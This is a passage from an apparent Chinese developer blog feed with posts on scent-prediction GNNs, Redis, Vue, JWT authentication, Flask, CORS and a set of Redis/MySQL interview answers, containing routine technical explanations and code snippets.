<p>人类的气味感知通过激活 400 种不同类型的嗅觉感受器 (Olfactory Receptors, OR) 来实现。嗅觉感受器位于鼻腔内名为嗅觉上皮的小块状组织中，由 100 万个嗅觉感应神经元 (Olfactory Sensory Neurons, OSN) 组成。这些 OSN 将信号发送给嗅球(olfactory bulb)，然后进一步传递到大脑皮层产生嗅觉。</p>
<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>基于视觉和声音深度学习研究的类似进展，我们通过类比得知，即使不知道所有相关系统的复杂细节，嗅觉深度学习应该也可以直接预测出输入分子的最终感应结果。解决气味预测问题将有助于发现新的合成气味剂，从而减少取用天然产品造成的生态影响。审视生成的嗅觉模型甚至可以带来嗅觉生物学的新见解。</p>
<p>小气味分子是香精香料最基本的组成成分，因此也代表了最简单的气味预测问题。不过，每个分子都有多个气味描述词。例如，对于香兰素 (Vanillin)的描述词有 甜美、香草味、奶油味 和 巧克力味 等，其中的某些气味会更为明显。因此，气味预测也是一个 多标签分类 问题。</p>
<p>在“气味机器学习：学习小分子的可泛化感知表征” (Machine Learning for Scent: Learning Generalizable Perceptual Representations of Small Molecules) 一文中，我们利用图神经网络（Graph Neural Networks,  GNNs），在不采用任何人工规则的情况下，把 图 (Graph) 输入到 GNN，直接预测单个分子的气味描述词。GNN 是一种深度神经网络，可以对图进行操作。研究证明，与目前的最新技术相比，此方法可显著提高气味预测能力，是非常有前景的未来研究方向。</p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>redis是什么——redis优点和特性</title>
    <url>/2020/02/19/redis/</url>
    <content><![CDATA[<p>redis教程<br><a id="more"></a></p>
<h1 id="redis定义"><a href="#redis定义" class="headerlink" title="redis定义"></a>redis定义</h1><p>redis是一个内存型的数据库<br>这里说明 redis是一个数据库，可以存放数据，比如字符串、哈希、列表、集合和有序集合等，他们都是以键值对形式存储的，简单来说就是Nosql——非关系型的数据库</p>
<p>redis是内存型的，不同于Mongo和MySQL等存放在硬盘中，redis数据是放在内存中的，所以redis读写速度极快，支持高并发，虽然是内存型的，但是也支持数据持久化，将数据保存到磁盘当中，重启时加载</p>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><p>redis可以实现主从复制<br>redis可以实现分布式锁，可用于分布式应用等，比如爬虫等<br>redis6支持多线程</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vue组件不能触发onload()方法</title>
    <url>/2020/02/18/vue-2/</url>
    <content><![CDATA[<p>vue组件不能触发onload()方法<br><a id="more"></a></p>
<p>vue组件是一种可重复使用的插件<br>但是这里vue组件不能触发onload()方法<br>vue组件的普通方法是可以调用的</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue组件</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt的前生今世</title>
    <url>/2020/02/18/jwt/</url>
    <content><![CDATA[<p>jwt的实现原理和优劣势<br><a id="more"></a><br>在前后端分离开发时为什么需要用户认证呢？原因是由于HTTP协定是不储存状态的(stateless)，这意味着当我们透过帐号密码验证一个使用者时，当下一个request请求时它就把刚刚的资料忘了。于是我们的程序就不知道谁是谁，就要再验证一次。所以为了保证系统安全，我们就需要验证用户否处于登录状态。</p>
<h1 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h1><p>前后端分离通过Restful API进行数据交互时，如何验证用户的登录信息及权限。在原来的项目中，使用的是最传统也是最简单的方式，前端登录，后端根据用户信息生成一个token，并保存这个 token 和对应的用户id到数据库或Session中，接着把 token 传给用户，存入浏览器 cookie，之后浏览器请求带上这个cookie，后端根据这个cookie值来查询用户，验证是否过期。</p>
<p>但这样做问题就很多，如果我们的页面出现了 XSS 漏洞，由于 cookie 可以被 JavaScript 读取，XSS 漏洞会导致用户 token 泄露，而作为后端识别用户的标识，cookie 的泄露意味着用户信息不再安全。尽管我们通过转义输出内容，使用 CDN 等可以尽量避免 XSS 注入，但谁也不能保证在大型的项目中不会出现这个问题。</p>
<p>在设置 cookie 的时候，其实你还可以设置 httpOnly 以及 secure 项。设置 httpOnly 后 cookie 将不能被 JS 读取，浏览器会自动的把它加在请求的 header 当中，设置 secure 的话，cookie 就只允许通过 HTTPS 传输。secure 选项可以过滤掉一些使用 HTTP 协议的 XSS 注入，但并不能完全阻止。</p>
<p>httpOnly 选项使得 JS 不能读取到 cookie，那么 XSS 注入的问题也基本不用担心了。但设置 httpOnly 就带来了另一个问题，就是很容易的被 XSRF，即跨站请求伪造。当你浏览器开着这个页面的时候，另一个页面可以很容易的跨站请求这个页面的内容。因为 cookie 默认被发了出去。</p>
<p>另外，如果将验证信息保存在数据库中，后端每次都需要根据token查出用户id，这就增加了数据库的查询和存储开销。若把验证信息保存在session中，有加大了服务器端的存储压力。那我们可不可以不要服务器去查询呢？如果我们生成token遵循一定的规律，比如我们使用对称加密算法来加密用户id形成token，那么服务端以后其实只要解密该token就可以知道用户的id是什么了。不过呢，我只是举个例子而已，要是真这么做，只要你的对称加密算法泄露了，其他人可以通过这种加密方式进行伪造token，那么所有用户信息都不再安全了。恩，那用非对称加密算法来做呢，其实现在有个规范就是这样做的，就是我们接下来要介绍的 JWT。</p>
<h1 id="Json-Web-Token（JWT）"><a href="#Json-Web-Token（JWT）" class="headerlink" title="Json Web Token（JWT）"></a>Json Web Token（JWT）</h1><p>JWT 是一个开放标准(RFC 7519)，它定义了一种用于简洁，自包含的用于通信双方之间以 JSON 对象的形式安全传递信息的方法。JWT 可以使用 HMAC 算法或者是 RSA 的公钥密钥对进行签名。它具备两个特点：</p>
<p>简洁(Compact)</p>
<p>可以通过URL, POST 参数或者在 HTTP header 发送，因为数据量小，传输速度快</p>
<p>自包含(Self-contained)</p>
<p>负载中包含了所有用户所需要的信息，避免了多次查询数据库</p>
<p>JWT 组成<br><img src="https://ww4.sinaimg.cn/large/006tNc79gy1fbv54tfilmj31120b2wl9.jpg" alt="JWT 组成"></p>
<p>Header 头部<br>头部包含了两部分，token 类型和采用的加密算法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>它会使用 Base64 编码组成 JWT 结构的第一部分,如果你使用Node.js，可以用Node.js的包base64url来得到这个字符串。</p>
<p>Base64是一种编码，也就是说，它是可以被翻译回原来的样子来的。它并不是一种加密过程。</p>
<p>Payload 负载<br>这部分就是我们存放信息的地方了，你可以把用户 ID 等信息放在这里，JWT 规范里面对这部分有进行了比较详细的介绍，常用的由 iss（签发者），exp（过期时间），sub（面向的用户），aud（接收方），iat（签发时间）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;iss&quot;: &quot;lion1ou JWT&quot;,</span><br><span class="line">    &quot;iat&quot;: 1441593502,</span><br><span class="line">    &quot;exp&quot;: 1441594722,</span><br><span class="line">    &quot;aud&quot;: &quot;www.example.com&quot;,</span><br><span class="line">    &quot;sub&quot;: &quot;lion1ou@163.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同样的，它会使用 Base64 编码组成 JWT 结构的第二部分</p>
<h1 id="Signature-签名"><a href="#Signature-签名" class="headerlink" title="Signature 签名"></a>Signature 签名</h1><p>前面两部分都是使用 Base64 进行编码的，即前端可以解开知道里面的信息。Signature 需要使用编码后的 header 和 payload 以及我们提供的一个密钥，然后使用 header 中指定的签名算法（HS256）进行签名。签名的作用是保证 JWT 没有被篡改过。</p>
<p>三个部分通过.连接在一起就是我们的 JWT 了，它可能长这个样子，长度貌似和你的加密算法和私钥有关系。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjU3ZmVmMTY0ZTU0YWY2NGZmYzUzZGJkNSIsInhzcmYiOiI0ZWE1YzUwOGE2NTY2ZTc2MjQwNTQzZjhmZWIwNmZkNDU3Nzc3YmUzOTU0OWM0MDE2NDM2YWZkYTY1ZDIzMzBlIiwiaWF0IjoxNDc2NDI3OTMzfQ.PA3QjeyZSUh7H0GfE0vJaKW4LjKJuC3dVLQiY4hii8s</span><br></pre></td></tr></table></figure></p>
<p>其实到这一步可能就有人会想了，HTTP 请求总会带上 token，这样这个 token 传来传去占用不必要的带宽啊。如果你这么想了，那你可以去了解下 HTTP2，HTTP2 对头部进行了压缩，相信也解决了这个问题。</p>
<p>签名的目的<br>最后一步签名的过程，实际上是对头部以及负载内容进行签名，防止内容被窜改。如果有人对头部以及负载的内容解码之后进行修改，再进行编码，最后加上之前的签名组合形成新的JWT的话，那么服务器端会判断出新的头部和负载形成的签名和JWT附带上的签名是不一样的。如果要对新的头部和负载进行签名，在不知道服务器加密时用的密钥的话，得出来的签名也是不一样的。</p>
<p>信息暴露<br>在这里大家一定会问一个问题：Base64是一种编码，是可逆的，那么我的信息不就被暴露了吗？</p>
<p>是的。所以，在JWT中，不应该在负载里面加入任何敏感的数据。在上面的例子中，我们传输的是用户的User ID。这个值实际上不是什么敏感内容，一般情况下被知道也是安全的。但是像密码这样的内容就不能被放在JWT中了。如果将用户的密码放在了JWT中，那么怀有恶意的第三方通过Base64解码就能很快地知道你的密码了。</p>
<p>因此JWT适合用于向Web应用传递一些非敏感信息。JWT还经常用于设计用户认证和授权系统，甚至实现Web应用的单点登录。</p>
<h1 id="JWT-使用"><a href="#JWT-使用" class="headerlink" title="JWT 使用"></a>JWT 使用</h1><p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fbv63pzqocj30pj0h8t9m.jpg" alt="jwt"><br>首先，前端通过Web表单将自己的用户名和密码发送到后端的接口。这一过程一般是一个HTTP POST请求。建议的方式是通过SSL加密的传输（https协议），从而避免敏感信息被嗅探。<br>后端核对用户名和密码成功后，将用户的id等其他信息作为JWT Payload（负载），将其与头部分别进行Base64编码拼接后签名，形成一个JWT。形成的JWT就是一个形同lll.zzz.xxx的字符串。<br>后端将JWT字符串作为登录成功的返回结果返回给前端。前端可以将返回的结果保存在localStorage或sessionStorage上，退出登录时前端删除保存的JWT即可。<br>前端在每次请求时将JWT放入HTTP Header中的Authorization位。(解决XSS和XSRF问题)<br>后端检查是否存在，如存在验证JWT的有效性。例如，检查签名是否正确；检查Token是否过期；检查Token的接收方是否是自己（可选）。<br>验证通过后后端使用JWT中包含的用户信息进行其他逻辑操作，返回相应结果。<br>和Session方式存储id的差异<br>Session方式存储用户id的最大弊病在于Session是存储在服务器端的，所以需要占用大量服务器内存，对于较大型应用而言可能还要保存许多的状态。一般而言，大型应用还需要借助一些KV数据库和一系列缓存机制来实现Session的存储。</p>
<p>而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。除了用户id之外，还可以存储其他的和用户相关的信息，例如该用户是否是管理员、用户所在的分组等。虽说JWT方式让服务器有一些计算压力（例如加密、编码和解码），但是这些压力相比磁盘存储而言可能就不算什么了。具体是否采用，需要在不同场景下用数据说话。</p>
<p>单点登录<br>Session方式来存储用户id，一开始用户的Session只会存储在一台服务器上。对于有多个子域名的站点，每个子域名至少会对应一台不同的服务器，例如：<a href="http://www.taobao.com，nv.taobao.com，nz.taobao.com，login.taobao.com。所以如果要实现在login.taobao.com登录后，在其他的子域名下依然可以取到Session，这要求我们在多台服务器上同步Session。使用JWT的方式则没有这个问题的存在，因为用户的状态已经被传送到了客户端。" target="_blank" rel="noopener">www.taobao.com，nv.taobao.com，nz.taobao.com，login.taobao.com。所以如果要实现在login.taobao.com登录后，在其他的子域名下依然可以取到Session，这要求我们在多台服务器上同步Session。使用JWT的方式则没有这个问题的存在，因为用户的状态已经被传送到了客户端。</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>JWT的主要作用在于（一）可附带用户信息，后端直接通过JWT获取相关信息。（二）使用本地保存，通过HTTP Header中的Authorization位提交验证。但其实关于JWT存放到哪里一直有很多讨论，有人说存放到本地存储，有人说存 cookie。个人偏向于放在本地存储，如果你有什么意见和看法欢迎提出。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/16/jwt-1/">jwt的优点和不足，以及jwt的缺点解决办法</a></li></ul></div>]]></content>
      <categories>
        <category>jwt</category>
      </categories>
      <tags>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>flask_restful蓝图使用方法</title>
    <url>/2020/02/18/flask-api/</url>
    <content><![CDATA[<p>flask-restful蓝图<br><a id="more"></a></p>
<p>导入Api方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Blueprint</span><br><span class="line">from flask_restful import Api, Resource, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">api_bp = Blueprint(&apos;api&apos;, __name__)</span><br><span class="line">api = Api(api_bp)</span><br><span class="line"></span><br><span class="line">class TodoItem(Resource):</span><br><span class="line">    def get(self, id):</span><br><span class="line">        return &#123;&apos;task&apos;: &apos;Say &quot;Hello, World!&quot;&apos;&#125;</span><br><span class="line"></span><br><span class="line">api.add_resource(TodoItem, &apos;/todos/&lt;int:id&gt;&apos;)</span><br><span class="line">app.register_blueprint(api_bp)</span><br></pre></td></tr></table></figure>
<p>建议新建不同功能的api目录文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Blueprint</span><br><span class="line">from flask_restful import Api, Resource</span><br><span class="line"></span><br><span class="line">api_bp = Blueprint(&apos;api&apos;, __name__)</span><br><span class="line">api = Api(api_bp)</span><br><span class="line"></span><br><span class="line">import app.api_bp.views,test</span><br></pre></td></tr></table></figure>
<p>然后在app的<strong>init</strong>中注册<br><code>app.register_blueprint(api_bp, url_prefix=&#39;/api&#39;)</code><br>这里通过url——prefix给api区分不同的路径</p>
]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-restful</tag>
      </tags>
  </entry>
  <entry>
    <title>flask本地开发使用ssl证书</title>
    <url>/2020/02/18/flask-https/</url>
    <content><![CDATA[<p>flask本地开发使用ssl证书<br><a id="more"></a></p>
<p>在app.run中添加证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(ssl_context=(&apos;cert.pem&apos;, &apos;key.pem&apos;))</span><br></pre></td></tr></table></figure>
<h1 id="flask线上服务器添加证书"><a href="#flask线上服务器添加证书" class="headerlink" title="flask线上服务器添加证书"></a>flask线上服务器添加证书</h1><p>通过nginx配置文件中添加即可</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue项目中eslint提示 &#39;xxx&#39; is defined but never used如何解决</title>
    <url>/2020/02/18/vue-1/</url>
    <content><![CDATA[<p>Vue项目中报错如何解决<br><a id="more"></a></p>
<h1 id="原因-某些第三方的兼容性原因"><a href="#原因-某些第三方的兼容性原因" class="headerlink" title="原因 某些第三方的兼容性原因"></a>原因 某些第三方的兼容性原因</h1><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>vue项目中的package.json中的eslintConfig中的rules中加入<code>&#39;no-unused-vars&#39;: &#39;off&#39;</code><br>rules: {<br>    ‘no-unused-vars’: ‘off’<br>}</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>跨域问题解决办法</title>
    <url>/2020/02/18/cors/</url>
    <content><![CDATA[<p>跨域问题Access to XMLHttpRequest’<em>‘from origin ‘</em>‘ has been blocked by CORS..Access-Control-Allow-Origin解决办法<br><a id="more"></a></p>
<p>跨域攻击一般发生在前后端分离的情况下</p>
<p>本地路径和目标路径不是同一个域名下引起的跨域问题，并且，就算两个域名是同一个一级域名不同二级域名的时候也是如此。</p>
<p>跨域问题解决办法</p>
<p>1、如果跨域请求发生在相同一级域名不同二级域名之间</p>
<p>例如：a.baidu.com  和 b.baidu.com</p>
<p>跨域直接在邀请求的接口页面中强制设置域为一级域     document.domain = “baidu.com”;</p>
<p>2、设置接口允许跨域访问</p>
<p>flask可以通过flask-cors实现跨域<br>不利因素，容易受到xss攻击。</p>
]]></content>
      <categories>
        <category>flask</category>
      </categories>
  </entry>
  <entry>
    <title>flask后端redis、MySQL等面试题</title>
    <url>/2020/02/15/flask-backend/</url>
    <content><![CDATA[<p>flask面试题<br><a id="more"></a><br>一、你的项目中缓存粒度是如何选择的?</p>
<p>缓存粒度一共分为4种.<br>1.缓存某个数值:一个键只保存一个值,性价比较低,使用率低,如果存储的话我们使用redis的String<br>2.缓存数据对象:数据库记录对应的具体数据,优点是可以多次复用,String,hash<br>3.缓存数据集合:数据库查询对应的结果集,可以和数据对象配合使用,方便数据对象的重用,hash,list,set,zset,String(zset,String)<br>4.缓存试图响应:试图返回的相应数据,复用性比较差,String<br>所以我们项目中主要对数据集合+数据对象进行缓存,他们的优点是复用性强,节省内存空间.</p>
<p>二、使用过redis的那些格式做过缓存,其他应用场景和优缺点是什么?</p>
<p>包括list,zset,set,hash和json字符串<br>其中我们使用过json字符串和zset<br>set用来存放无序去重的数据, 如果有判断是否存在的需求<br>zset有排序的需要list,如果说是按时间查询, 查询的结果固定, 不需要分页的情况下,我们使用list因为查询的比较快<br>但如果有额外排序要求, 而且需要分页, 我们使用zset(查询时间跟查询的长度和数据量有关,跟查询区别无关, 查询速度比较均衡),<br>增加数据效率和存储的数据量负相关,数据量越大,添加时间越长,查询数据效率和存储的数据量负相关,并且和查询的结果集数据量有关<br>json字符串需要进行转换,使用pickle模块提高性能,无法单独更新某个字段,节省空间</p>
<p>三、生产环境下缓存数据redis满了怎么办,如何在不停止服务器的前提下扩容?</p>
<p>我们通过Redis的Cluster集群来实现扩展存储空间,在不停掉Cluster集群环境的情况下通过redis-trib.rb脚本文件来动态的往集群环境中增加主,从节点,也可以动态的从集群环境中删除节点<br>配置连接<a href="https://www.cnblogs.com/PatrickLiu/p/8473135.html" target="_blank" rel="noopener">https://www.cnblogs.com/PatrickLiu/p/8473135.html</a></p>
<ol>
<li>创建两个redis实例, 修改配置文件ip和端口号</li>
<li>把创建的两个实例添加到cluster集群中# ruby redis-trib.rb add-node 192.168.127.130:7006 192.168.127.130:7000</li>
<li>cluster nodes 进行验证节点 , (默认都是主master)</li>
<li>从主节点master上抽取一些slots分给要加入的这个主节点 # ruby redis-trib.rb reshard 192.168.127.130:7000</li>
<li>选择接收数据槽的节点和数据槽产生的方式 选择all</li>
<li>执行分配计划 yes_</li>
<li>增加这从节点7007到集群中 # ruby redis-trib.rb add-node 192.168.127.130:7007 192.168.127.130:7000</li>
<li>将从7007节点作为主节点的从节点实现主从配置 进入 7007redis<br>执行&gt; cluster replicate 71ecd970838e9b400a2a6a15cd30a94ab96203bf(这里是主节点的ID)<br>首先把redis的 maxmemory 调到最大, 然后把这个maxmemory-policy调成LFU淘汰策略<br>使用过期策略和缓存淘汰机制<br>过期策略中选择惰性过期+定期过期(每100ms对设置了过期时间的数据随机查询并删除过期数据)<br>缓存淘汰中有LFU和LRU.LFU:优先淘汰不是频繁使用的数据,有定期衰减这个机制,由于消费较高,<br>所以我们基本会选择LRU:优先淘汰不是最近使用的数据.淘汰策略maxmemory-policy volatile-lru</li>
</ol>
<p>四、缓存穿透和缓存雪崩是什么,如何解决?</p>
<p>缓存穿透，是指查询一个数据库一定不存在的数据。正常的使用缓存流程大致是，数据查询先进行缓存查询，<br>如果key不存在或者key已经过期，再对数据库进行查询，并把查询到的对象，放进缓存。如果数据库查询对象为空，则不放进缓存.<br>解决办法:1.对于数据库中不存在的数据,也对其在缓存中设置默认值一般过期时间会比较短<br>2.可以设置一些过滤规则, 如布隆过滤器(算法, 用于判断数据是否包含在集合中), 将所有可能的值录入过滤器, 如果不包含直接返回None, 有误杀概率<br>​<br>缓存雪崩，是指在某一个时间段，缓存集中过期失效。<br>1.设置过期时间时,添加随机值,让过期时间进行一定程度分散<br>2.多级缓存的方式来处理<br>3.利用锁/队列的形式</p>
<p>五、项目中使用的缓存模式是什么,遇到过哪些问题?</p>
<p>1.Cache Aside 更新模式(同时更新缓存和数据库) 更新丢失(先更新数据库,后删除缓存), 缓存穿透, 缓存雪崩<br>2.Read/Write Through 更新模式(通读通写) 应用程序只需要维护缓存，数据库的维护工作由缓存代理<br>read through : 在查询操作中更新缓存，也就是说，当缓存失效的时候，Cache Aside 模式是由调用方负责把数据加载入缓存，而 Read Through 则用缓存服务自己来加载。<br>write through: 和 Read Through 相仿，不过是在更新数据时发生。当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。<br>如果命中了缓存，则更新缓存，然后由缓存自己更新数据库（这是一个同步操作）<br>3.Write Behind Caching 更新模式 就是在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库,这个设计的好处就是直接操作内存速度快。<br>因为异步，Write Behind Caching 更新模式还可以合并对同一个数据的多次操作到数据库，所以性能的提高是相当可观的。<br>但其带来的问题是，数据不是强一致性的，而且可能会丢失。另外，Write Behind Caching 更新模式实现逻辑比较复杂，因为它需要确认有哪些数据是被更新了的，哪些数据需要刷到持久层上。<br>只有在缓存需要失效的时候，才会把它真正持久起来。</p>
<p>六、读写分离对事务是否有影响？</p>
<p>对于写操作包括开启事务和提交或回滚要在一台机器上执行，分散到多台master执行后数据库原生的单机事务就失效了。<br>对于事务中同时包含读写操作，与事务隔离级别设置有关，如果事务隔离级别为read-uncommitted 或者 read-committed，读写分离没影响，<br>如果隔离级别为repeatable-read、serializable，读写分离就有影响，因为在slave上会看到新数据，而正在事务中的master看不到新数据。</p>
<p>七、varchar和char的区别,utf8字符集下varchar最多能存多少个字符 ?</p>
<p>char的长度不可变,查询效率高,可能造成存储浪费,用于手机号.varchar长度可变,,查询效率低,节省空间,用于用户名.在UTF8字符集下最大长度不能超过21845</p>
<p>八、primary key和unique的区别？</p>
<p>unique可空,可以在一个表里的一个或多个字段定义;<br>primary key不可空不可重复,在一个表里可以定义联合主键.</p>
<p>九、什么是外键约束?</p>
<p>不使用SQL建立外键, 而是定义普通的键去记录主键(逻辑外键) 仍然可以多表联查,删除和更新效率高,但是会有出错的风险,有程序逻辑来控制.</p>
<p>十、什么是索引?</p>
<p>为了提高查询速度提供的一种数据结构, 类似书的目录, 方便快速查询出数据, 而不是从头到尾的依次对比,优点:增加查询速度,缺点:增加数据库的存储空间,减慢增删改速度</p>
<p>十一、索引的分类?</p>
<p>普通索引index:不要用可空列作为索引, 易出错.<br>适合数据量超过300的表,经常与其他表进行连接的表，经常出现在Where子句中的字段，选择性高的字段和小字段.频繁进行数据操作的表，不要建立太多的索引；适用于改动小,查询多的场景.<br>联合索引:联合索引必须符合最左原则, 否则无效.<br>主键索引:创建主键后自动生成<br>唯一索引:设置唯一约束后自动生成<br>外键索引:设置外键约束后自动生成</p>
<p>十二、索引的原理</p>
<p>Mysql的索引存储结构为B+tree结构 平衡二叉树.<br>聚簇索引: 主键B+树在叶子节点直接存储的是数据行, InnoDB引擎使用.<br>优点: 主键查询的速度非常快<br>缺点: 增删改比较慢,其它的主键查询要二次查询<br>非聚簇索引: 主键B+树在叶子节点只是存储真正数据行的地址, 数据行和索引存储在不同的结构中,MyISAM引擎使用<br>优点: 增删改比较快, 非主键的查询也比较快<br>缺点: 不支持事务</p>
<p>十三、InnoDB的主键为什么选择自增 ?</p>
<p>数据和主键索引是绑定在一起的, 主键自增就会让数据顺序添加到B+Tree中, 写完一页再写下一页, 不需要为了索引的排列而移动数据和页分裂, 并且移动和页分裂也会降低查询速度 </p>
<p>十四、能不能使用业务字段作为主键(业务主键) ?</p>
<p>可以, 但不好<br>使用自增主键性能会快很多<br>业务字段更新频繁,一旦修改,索引也要跟着变,成本较高<br>所以一般采用和业务无关的数据充当主键(逻辑主键)</p>
<p>十五、联合主键</p>
<p>将多个业务键联合定义为主键<br>优点:节省空间<br>缺点:和业务有关, 频繁改动,不是自增,性能差,尽量不要用</p>
<p>十六、三范式和反范式设计</p>
<p>第一范式: 字段具有原子性, 不可拆分<br>第二范式: 依赖于全部主键, 而非部分主键<br>第三范式: 只依赖于主键, 非主键字段互不依赖<br>目的是减少冗余字段<br>如果单独定义字段来记录,该字段就称为冗余字段,这种设计称为反范式设计.<br>通过加入冗余字段,来提高数据库的查询速度,减少关联查询,用空间换取时间<br>范式是武功招式, 如何运用全看自己, 也有缺点, 查询速度高了,会增加很多写入操作</p>
<p>十七、分库分表前后的问题?</p>
<p>分表分库前的问题,<br>用户请求量太大,解决办法:分散请求到多个服务器上<br>单库太大,解决方法:切分成更多更小的库<br>单表太大,解决方法:切分成多个数据集更小的表<br>分表分库后的问题,<br>事务支持,分表分库后,就成了分布式事务<br>多库结果集合并<br>跨库join</p>
<p>十八、mysql锁</p>
<p>它的目的是解决并发情况下资源抢夺问题, 维护数据的一致性,<br>mysql的锁虽然开发者可以手动设置, 但比较影响并发性, 一般会使用乐观锁代替,由于mysql会自动使用锁, 所以需要了解锁机制, 以便优化数据库并发能力.<br>分为行级锁和表级锁.<br>行级锁:对数据行锁定, 并发好, 资源消耗多<br>表级锁:对整个表锁定, 并发差, 资源消耗少</p>
<p>十九、锁和事务,锁和事务的优化建议</p>
<p>无论操作是否在事务中, 都可以获取锁, 只不过在事务中, 获取的锁只有执行完事务才会释放<br>优化建议:<br>1.使用读取已提交事务隔离级别<br>2.精心设计索引<br>3.选择合理的事务大小<br>4.最好一次性请求足够级别的锁<br>5.约定以相同的顺序访问各表<br>6.用相等条件访问数据<br>7.除非必须，查询时不要显式加锁</p>
<p>二十、行锁与读写权限</p>
<p>行共享锁:获取行共享锁后, 当前事务可以读,不一定能写;其他事务可以读,不能写.<br>共享锁容易出现死锁陷阱<br>行排他锁:获取后,当前事务既可以读,也可以写;其他事务可以读,不能写<br>行锁是通过给索引加锁实现的,如果查询时没有触发索引,就会锁表,使用读取已提交事务隔离级别,只锁行,不锁表</p>
<p>二十一、什么是间隙锁</p>
<p>对于键值在条件范围内但并不存在的记录，叫做’间隙’<br>在击中索引的情况下,获取行锁时,InnoDB不仅会对符合条件的已有数据行加锁,也会对这个’间隙’加锁<br>InnoDB完整的行锁机制为  下键锁<br>缺点是会阻塞符合条件的插入操作,目的是防止幻读.<br>解决办法:1.尽量不要对有频繁插入的表进行范围条件的检索<br>2.使用读取已提交事务隔离级别<br>3.使用唯一索引或主键索引进行查询 </p>
<p>二十二、mysql事务和事务隔离级别</p>
<p>目的: 保证数据库安全稳定运行的技术<br>四大特性: ACID 原子性 一致性 隔离性 持久性<br>原子性: 要么都成功, 要么都失败,实现机制是undo log<br>一致性:操作前后, 系统稳定, 数据一致,原子性不代表一致性:<br>脏读/不可重复读/幻读: 解决办法:调整事务级别<br>提交事务后, 只有一半操作持久化成功: 解决办法: redo log<br>隔离性:每个事务是独立的,相互不会影响,实现机制多版本并发控制+锁(MVCC+锁)<br>持久性:保证事务的执行结果一定能在数据库中同步完成, 无论数据库所在硬件是否瘫痪,实现机制: redo log<br>原子性 持久性 隔离性 实现了一致性<br>事务隔离级别:四个级别, 只会用到读已提交和可重复读这两个<br>mysql默认为可重复读,更建议使用读取已提交,不会加间隙锁,索引没触发,不会锁表,只是锁行,不可重复读和幻读问题, 一般不需要管, 如果有强制要求, 加悲观锁/乐观锁</p>
<p>二十三、MVCC多版本并发控制</p>
<p>简单来说就是对数据做了多版本控制,事务隔离级别中的RC和RR就是MVCC实现的<br>RR可重复读级别:<br>快照读: select <em> from xx: # 在事务中无论读多少次都和第一次读的结果一样<br>当前读: select </em> from xx lock in share mode; select * from xx for update和insert update delete 语句<br>RC读取已提交级别:<br>仍然有快照读, 事务提交成功的数据可以读取得到, 但读不到未提交的数据</p>
<p>二十四、MyISAM 和InnoDB</p>
